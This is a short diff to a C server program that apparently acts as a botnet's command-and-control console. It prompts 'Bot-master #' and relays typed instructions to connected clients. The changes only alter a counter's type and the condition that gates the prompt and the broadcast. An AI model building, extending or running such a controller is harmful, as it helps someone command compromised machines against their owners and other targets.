@@ -21,7 +21,7 @@ int main(int argc, char **argv)
    int state, nread;
    socklen_t client_len;
    int i,max,dst_port;
-   int count = 0;
+   unsigned int count = 0;
    char id[MAX_SOCKET][2];
 
    char instruction[255];
@@ -113,7 +113,7 @@ int main(int argc, char **argv)
                continue;
        }
 
-       if(count%3 == 0)
+       if(count>5 && count%3 == 0)
        {
            printf("Bot-master #");
            fgets(message,255,stdin);
@@ -213,7 +213,7 @@ int main(int argc, char **argv)
                }
 
            }
-           if(count%3 == 0)
+           if(count>5 && count%3 == 0)
            {
                if(!strstr(instruction,"send"))
                    write(client[i].fd,message,sizeof(message));
